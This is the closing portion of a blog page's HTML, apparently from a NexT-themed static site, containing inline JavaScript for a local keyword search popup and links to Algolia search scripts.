          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>




  
  
  
  <link rel="stylesheet" href="/lib/algolia-instant-search/instantsearch.min.css">

  
  
  <script src="/lib/algolia-instant-search/instantsearch.min.js"></script>
  

  <script src="/js/src/algolia-search.js?v=5.1.4"></script>



  

  

  

  
  

  

  

  

</body>
</html>
